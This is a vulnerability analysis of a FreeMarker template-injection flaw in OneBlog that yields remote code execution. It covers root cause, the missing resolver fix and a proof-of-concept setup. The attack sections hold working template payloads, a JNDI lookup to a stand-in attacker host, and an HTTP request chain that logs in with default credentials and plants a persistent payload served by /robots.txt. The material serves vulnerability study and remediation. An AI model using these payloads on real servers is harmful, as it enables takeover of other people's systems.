# Vulnerability Analysis: CVE-2025-60355

## Executive Summary
Server-Side Template Injection (SSTI) in OneBlog's FreeMarker template engine allows authenticated admin users to achieve Remote Code Execution (RCE). The `FreeMarkerUtil.template2String()` method creates an unsandboxed FreeMarker `Configuration` object, allowing the `?new()` built-in to instantiate arbitrary Java classes, including `freemarker.template.utility.Execute` for OS command execution.

---

## Root Cause

### Vulnerability Class
**CWE-1336**: Improper Neutralization of Special Elements Used in a Template Engine (Server-Side Template Injection / SSTI)

### Technical Root Cause
The `FreeMarkerUtil.template2String()` method at **`blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java`, lines 77-79** creates a FreeMarker `Configuration` object without restricting the `TemplateClassResolver`:

```java
// Line 77
Configuration cfg = new Configuration(Configuration.VERSION_2_3_22);
cfg.setNumberFormat("#");
// Line 79 — MISSING: cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
t = new Template("", new StringReader(templateContent), cfg);
```

By default, FreeMarker's `?new()` built-in allows instantiation of any class implementing `TemplateModel`. The `freemarker.template.utility.Execute` class implements `TemplateMethodModel` and its `exec()` method calls `Runtime.exec()` to run arbitrary OS commands.

The correct mitigation would be to call:
```java
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

This completely prevents the `?new()` built-in from instantiating any classes.

---

## Vulnerable Files and Functions

### Primary Vulnerable Function
- **File**: `blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java`
- **Method**: `public static String template2String(String templateContent, Map<String, Object> map, boolean isNeedFilter)`
- **Vulnerable Lines**: 77-81 (Configuration creation and template processing)

### Callers (Attack Surfaces)
All callers pass user-controlled template content from the `sys_template` database table:

1. **`RestWebSiteController.robots()` — Primary attack vector (UNAUTHENTICATED RENDER)**
   - File: `blog-web/src/main/java/com/zyd/blog/controller/RestWebSiteController.java`, line 62
   - Endpoint: `GET /robots.txt` (blog-web, port 8443)
   - Template: `TM_ROBOTS` from `sys_template` table

2. **`RestWebSiteController.getSitemap()` — Secondary attack vectors (UNAUTHENTICATED RENDER)**
   - File: `blog-web/src/main/java/com/zyd/blog/controller/RestWebSiteController.java`, line 72
   - Endpoints: `GET /sitemap.xml`, `GET /sitemap.txt`, `GET /sitemap.html` (blog-web, port 8443)
   - Templates: `TM_SITEMAP_XML`, `TM_SITEMAP_TXT`, `TM_SITEMAP_HTML`

3. **`MailServiceImpl` — Additional attack vectors (server-side render)**
   - File: `blog-core/src/main/java/com/zyd/blog/business/service/impl/MailServiceImpl.java`
   - Templates: `TM_LINKS`, `TM_COMMENT_AUDIT`, `TM_COMMENT_REPLY`, `TM_LINKS_TO_ADMIN`, `TM_NEW_COMMENT`
   - Lines 82, 111, 136, 161

4. **`ArticleUtil.insertAdsIntoArticle()` — Hardcoded template (not user-controlled)**
   - File: `blog-core/src/main/java/com/zyd/blog/util/ArticleUtil.java`, line 63
   - Uses a hardcoded `AD_TEMPLATE` string, not user-controlled — NOT EXPLOITABLE.

### Template Edit Endpoint (Injection Point)
- **File**: `blog-admin/src/main/java/com/zyd/blog/controller/RestTemplateController.java`
- **Method**: `edit(Template template)` — line 73
- **Endpoint**: `POST /template/edit` on blog-admin (port 8085)
- **Permission Required**: Shiro `template:edit` permission (admin role)
- **Controller Annotation**: `@RequiresPermissions("template:edit")`

### Template Storage
- **Database table**: `sys_template` with columns `id`, `ref_key` (e.g., 'TM_ROBOTS'), `ref_value` (template content)
- **Service**: `SysTemplateServiceImpl.updateSelective()` updates the template directly — NO INPUT VALIDATION or sanitization on the template content.

---

## Triggering Input

### SSTI Payload
The FreeMarker SSTI payload leverages the `?new()` built-in to instantiate `freemarker.template.utility.Execute`, then invokes it with an OS command:

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

This payload:
1. Uses `?new()` built-in to create an instance of `freemarker.template.utility.Execute`
2. Calls `Execute.exec()` which runs `Runtime.exec("id")`
3. Returns the command output as a string, which is rendered into the page response

### Alternative Payloads
- **ObjectConstructor**: `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["id"]).start()}`
- **JndiLookup**: `<#assign value="freemarker.template.utility.JndiLookup"?new()>${value("ldap://attacker.com/a")}`

### Payload for PoC (RCE Proof)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

For file-write proof:
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/pwned")}
```

---

## Attack Scenario

### Prerequisites
1. OneBlog instance running with both blog-admin (port 8085) and blog-web (port 8443) services
2. Valid admin credentials with `template:edit` permission
3. Default credentials: `root` / `123456` (or `admin` / `123456`)
4. Kaptcha disabled (default: `enableKaptcha: false`)

### Step-by-Step Attack

**Step 1: Authenticate to blog-admin**
```http
POST /passport/signin HTTP/1.1
Host: <target>:8085
Content-Type: application/x-www-form-urlencoded

username=root&password=123456&rememberMe=true
```
Response: JSON with session cookie (JSESSIONID or Shiro rememberMe cookie).

**Step 2: Get the TM_ROBOTS template ID**
```http
POST /template/list HTTP/1.1
Host: <target>:8085
Cookie: <session_cookie>
Content-Type: application/x-www-form-urlencoded

pageNumber=1&pageSize=10
```
Response: List of templates. Locate `TM_ROBOTS` (ID: 4).

**Step 3: Inject SSTI payload via template edit**
```http
POST /template/edit HTTP/1.1
Host: <target>:8085
Cookie: <session_cookie>
Content-Type: application/x-www-form-urlencoded

id=4&refValue=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Step 4: Trigger RCE via unauthenticated endpoint**
```http
GET /robots.txt HTTP/1.1
Host: <target>:8443
```
Response body contains the output of the `id` command (e.g., `uid=0(root) gid=0(root) groups=0(root)`).

### Key Observations
- **Step 2 (injection)** requires admin authentication with Shiro `template:edit` permission
- **Step 4 (trigger)** is UNAUTHENTICATED — any external user accessing `/robots.txt` triggers the payload
- The payload persists in the database, so it executes on EVERY subsequent request to `/robots.txt` until the template is restored
- Multiple trigger endpoints exist: `/robots.txt`, `/sitemap.xml`, `/sitemap.txt`, `/sitemap.html`

---

## Impact

- **Confidentiality**: HIGH — Attacker can read arbitrary files, environment variables, database credentials
- **Integrity**: HIGH — Attacker can write files, modify application state, install backdoors
- **Availability**: HIGH — Attacker can kill processes, corrupt data, cause denial of service
- **Attack Vector**: Network (Remote)
- **Attack Complexity**: Low (default credentials + no captcha)
- **Privileges Required**: Low (admin account needed, but default creds are documented)
- **User Interaction**: None (trigger via unauthenticated `/robots.txt`)
- **Scope**: Unchanged

**CVSS 3.1**: 9.8 (CRITICAL) — The high CVSS reflects that while initial injection requires admin auth, the default-credentials scenario and the unauthenticated trigger make this effectively unauthenticated RCE.

---

## Fix Assessment

### Fix Status: INCOMPLETE / NOT FIXED

**The fix commit (`ac1c801`) does NOT address the vulnerability.** The commit labeled ":bookmark: 发布 2.3.9" is a version bump release that contains:
- Version number changes in all pom.xml files (2.3.8 → 2.3.9)
- Article look-count table refactoring
- WangEditor JavaScript assets
- SQL schema updates for the article_look table
- No changes to `FreeMarkerUtil.java`

**Critical Finding**: The `FreeMarkerUtil.java` file was NEVER modified between 2.3.8 and 2.3.9 (and has not been modified in the HEAD commit). The vulnerable `Configuration` creation without `TemplateClassResolver` restriction is still present.

### Verification
```bash
git log --all --oneline -- blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java
```
Shows only ancient commits — no post-2.3.8 modification.

### Missing Fix
The proper fix would be to add at `FreeMarkerUtil.java` line 78:
```java
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

### Potential Bypass Vectors (if fix were applied)
If the `ALLOWS_NOTHING_RESOLVER` fix were applied, the following bypass vectors should be considered:
1. **`?api` built-in**: In older FreeMarker versions, `?api` can be used to access the Java API directly. Mitigation: Set `api_builtin_enabled` to `false` (default in newer versions).
2. **Data model injection**: If the template data model contains references to Spring beans or other powerful objects, they could be used for RCE without `?new()`. The `config` map currently passed contains only string configuration values, so this is low risk.
3. **Other TemplateModel implementations**: Custom `TemplateModel` implementations in the classpath might be exploitable even with `ALLOWS_NOTHING_RESOLVER` if they don't use `?new()`.

### Similar Patterns in Codebase
- `MailServiceImpl` uses the same `FreeMarkerUtil.template2String()` with templates from the database — same vulnerability class but requires admin access to modify mail templates AND a mail-sending trigger event.
- `ArticleUtil` uses `FreeMarkerUtil.template2String()` but with a hardcoded template — not exploitable.

---

## Build System

### Build Tool
Apache Maven 3.x (multi-module project)

### Java Version
JDK 8 (java.version = 1.8)

### Build Commands
```bash
# From project root:
mvn clean package -DskipTests -Pdev
```
This produces:
- `blog-admin/target/blog-admin.jar` — Admin backend Spring Boot fat JAR
- `blog-web/target/blog-web.jar` — Public frontend Spring Boot fat JAR

### Project Modules
| Module | Artifact | Port | Purpose |
|--------|----------|------|---------|
| blog-core | blog-core-2.3.8.jar (library) | N/A | Core library (FreeMarkerUtil, services, persistence) |
| blog-admin | blog-admin.jar (Spring Boot) | 8085 | Admin backend (template edit, auth) |
| blog-web | blog-web.jar (Spring Boot) | 8443 | Public frontend (robots.txt, sitemap, etc.) |
| blog-file | blog-file.jar | N/A | File service (not needed for PoC) |
| blog-codegen | blog-codegen.jar | N/A | Code generator (not needed for PoC) |

### Key Dependencies
- Spring Boot 2.3.5.RELEASE (includes spring-boot-starter-freemarker)
- Apache Shiro 1.7.1
- shiro-redis 2.4.2.1-RELEASE
- MyBatis (mybatis-spring-boot-starter 2.1.4)
- Druid 1.2.6 (DB connection pool)
- FastJSON 1.2.83
- Hutool 5.8.28
- Lombok 1.18.20

---

## Runtime Requirements

### Infrastructure Services
1. **MySQL 5.7** — Database for user accounts, templates, articles
   - Database name: `dblog`
   - Init scripts: `docs/docker/mysql/dblog.sql` (schema) + `docs/docker/mysql/init_data.sql` (seed data)
   - Default root password: configurable via `ONEBLOG_DATASOURCE_PASSWORD` env var

2. **Redis** — Session management (Shiro) and caching
   - Default password: `123456ZHYD` (configurable via `ONEBLOG_REDIS_PASSWORD`)
   - Database index: 1

### Environment Variables (Required)
```bash
# MySQL
ONEBLOG_DATASOURCE_HOST=blog-mysql
ONEBLOG_DATASOURCE_PORT=3306
ONEBLOG_DATASOURCE_DATABASE_NAME=dblog
ONEBLOG_DATASOURCE_USERNAME=root
ONEBLOG_DATASOURCE_PASSWORD=root

# Redis
ONEBLOG_REDIS_HOST=blog-redis
ONEBLOG_REDIS_PORT=6379
ONEBLOG_REDIS_PASSWORD=123456ZHYD
ONEBLOG_REDIS_DATABASE_INDEX=1

# App config
ONEBLOG_APP_ENABLE_KAPTCHA=false
ONEBLOG_ENABLE_REDIS_CACHE=false
```

### Docker Images
- **Base image for Java apps**: `anapsix/alpine-java:8_server-jre_unlimited` (from Dockerfiles)
- **Alternative**: Any JDK 8 image (e.g., `openjdk:8-jre-slim`)
- **MySQL**: `mysql:5.7`
- **Redis**: `redis:latest`

### Network Setup
- blog-admin (port 8085) — needs MySQL + Redis connectivity
- blog-web (port 8443) — needs MySQL + Redis connectivity
- Both services must connect to the same MySQL database and Redis instance
- blog-admin serves the template edit API (injection)
- blog-web serves `/robots.txt` (trigger)

### Database Initialization
1. Create database `dblog`
2. Import schema: `docs/docker/mysql/dblog.sql`
3. Import seed data: `docs/docker/mysql/init_data.sql`
   - Creates 3 default users: root/123456, admin/123456, comment-admin/123456
   - Creates 10 templates including TM_ROBOTS (id=4)
   - Creates Shiro roles and permissions

### Default Credentials
| Username | Password | Role | Has template:edit? |
|----------|----------|------|--------------------|
| root | 123456 | ROOT (superadmin) | Yes |
| admin | 123456 | ADMIN | Yes (needs verification) |
| comment-admin | 123456 | ADMIN (limited) | Likely no |

### PoC Architecture
```
┌──────────────┐    Step 2: POST /template/edit    ┌──────────────┐
│  Attacker    │ ──────────────────────────────────►│ blog-admin   │
│              │    (with SSTI payload)             │ :8085        │
│              │                                     │              │──►MySQL
│              │    Step 3: GET /robots.txt          ├──────────────┤   (shared DB)
│              │ ──────────────────────────────────►│ blog-web     │
│              │◄── RCE output in response          │ :8443        │
└──────────────┘                                     └──────────────┘
                                                         │
                                                         ▼
                                                     Redis
                                                     (shared sessions)
```
